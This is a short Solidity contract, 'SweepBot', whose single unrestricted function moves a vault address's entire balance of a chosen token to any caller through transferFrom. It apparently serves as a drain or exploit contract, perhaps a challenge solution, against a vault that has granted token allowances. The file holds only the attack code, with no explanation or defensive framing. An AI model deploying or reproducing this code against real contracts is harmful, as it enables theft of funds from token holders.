pragma solidity ^0.8.0;

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transferFrom(address, address, uint256) external returns (bool);
}

contract SweepBot {
    function sweepToken(address cryptovaultAddress, address tokenAddress) external {
        uint256 amount = IERC20(tokenAddress).balanceOf(cryptovaultAddress);
        IERC20(tokenAddress).transferFrom(cryptovaultAddress, msg.sender, amount);
    }
}